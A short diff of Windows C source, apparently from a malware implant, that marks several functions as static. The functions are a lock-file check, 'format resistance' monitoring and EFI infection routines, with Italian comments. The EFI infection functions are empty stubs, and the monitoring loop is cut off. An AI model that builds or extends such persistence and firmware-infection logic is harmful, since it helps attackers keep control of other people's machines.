@@ -3,9 +3,9 @@
 #include "H4-DLL.h"
 #include "bss.h"
 
-BOOL is_format_resistant = FALSE;
+static BOOL is_format_resistant = FALSE;
 
-BOOL IsFiles()
+static BOOL IsFiles()
 {
 	HANDLE hFile;
 	char obj_string[MAX_PATH];
@@ -21,7 +21,7 @@ BOOL IsFiles()
 
 // Torna TRUE se il file di lock c'e' gia' o se e'riuscito a crearlo
 #define LOCK_FORMAT_FILE "\\.flck"
-BOOL CheckCreateLock()
+static BOOL CheckCreateLock()
 {
 	HANDLE hFile;
 	char obj_string[MAX_PATH];
@@ -45,20 +45,20 @@ BOOL CheckCreateLock()
 }
 
 // Chiama il driver per vedere se l'EFI e' gia' infetto
-BOOL IsEFIInfected()
+static BOOL IsEFIInfected()
 {
 	// XXX
 	return FALSE;
 }
 
 // Chiama il driver per vedere infettare l'EFI
-void InfectEFI()
+static void InfectEFI()
 {
 	// XXX
 }
 
 #define FORMAT_RESISTANCE_TIME 60000
-DWORD WINAPI MonitorFormatStatus(DWORD dummy)
+static DWORD WINAPI MonitorFormatStatus(DWORD dummy)
 {
 
 	LOOP {
